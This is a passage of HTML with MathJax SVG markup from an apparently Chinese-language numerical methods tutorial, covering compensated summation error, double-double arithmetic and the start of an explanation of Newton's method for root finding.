transform="translate(3880.4,0)"><g data-mml-node="mi"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mn" transform="translate(439,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(4723,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 相比于普通加法的 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.762ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2547 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1752,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(2158,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>
误差，这个改进显著降低了精度损失。</p>
<p>如果需要进一步提高精度，可以使用 <strong>double-double
算术</strong>，即用两个 <code>double</code> 变量存储一个高精度数： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="4.933ex" height="1.756ex" role="img" focusable="false" viewBox="0 -694 2180.4 776"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(751.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(1751.4,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container></span> 其中：</p>
<ul>
<li><code>a</code> 存储高位部分（高精度）</li>
<li><code>b</code> 存储低位部分（误差修正）</li>
</ul>
<p>这种方法可以推广到
<strong>四精度（quad-double）</strong>，甚至更高精度的算术运算。</p>
<h4 id="牛顿法">牛顿法</h4>
<p>牛顿法是一个简单而强大的算法，用于寻找实值函数的近似根，也就是解决以下通用方程的根：
<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.447ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3733.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1511,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2177.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3233.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container></span> 牛顿法的假设条件是：至少存在一个根，且函数 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.299ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 1900 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1511,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>
在搜索区间上是连续且可导的。虽然存在一些特殊的边界情况，但它们在实际应用中几乎不会发生。</p>
<p>牛顿法的基本思想是：从某个初始的近似值 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="2.282ex" height="1.375ex" role="img" focusable="false" viewBox="0 -442 1008.6 607.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></g></svg></mjx-container></span>
开始，然后通过迭代方法不断改进该值。每次迭代时，我们会在 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="6.345ex" height="1.676ex" role="img" focusable="false" viewBox="0 -583 2804.5 740.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(849.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(1905.6,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span>
处画出该函数的切线，并让下一个近似值 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.471ex;" xmlns="http://www.w3.org/2000/svg" width="4.078ex" height="1.471ex" role="img" focusable="false" viewBox="0 -442 1802.6 650"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container></span> 等于切线与 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container></span>-轴的交点的横坐标。直观上，如果函数
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.299ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 1900 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1511,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 是“良好的”且 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.034ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 899 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span> 已经足够接近根，那么 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.471ex;" xmlns="http://www.w3.org/2000/svg" width="4.078ex" height="1.471ex" role="img" focusable="false" viewBox="0 -442 1802.6 650"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container></span> 会比 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.034ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 899 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 